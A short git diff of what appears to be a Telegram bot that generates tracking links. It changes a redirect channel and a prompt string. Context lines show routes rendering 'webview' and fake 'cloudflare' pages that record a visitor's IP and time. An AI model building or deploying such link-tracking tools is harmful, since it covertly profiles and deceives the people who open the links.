@@ -30,7 +30,7 @@ if(req.params.path != null){
 res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("https://t.me/th30neand0nly0ne");
+res.redirect("https://t.me/XD_MUSIC_BOTZ");
 }
 
          
@@ -48,7 +48,7 @@ if(req.params.path != null){
 res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("https://t.me/th30neand0nly0ne");
+res.redirect("https://t.me/XD_MUSIC_BOTZ");
 }
 
          
@@ -62,7 +62,7 @@ const chatId = msg.chat.id;
 
  
 
-if(msg?.reply_to_message?.text=="🌐 Enter Your URL"){
+if(msg?.reply_to_message?.text=="🌐 Enter Your URL 🔗"){
  createLink(chatId,msg.text); 
 }
   
@@ -156,7 +156,7 @@ function createNew(cid){
 var mk={
 reply_markup:JSON.stringify({"force_reply":true})
 };
-bot.sendMessage(cid,`🌐 Enter Your URL`,mk);
+bot.sendMessage(cid,`🌐 Enter Your URL 🔗`,mk);
 }
 
 
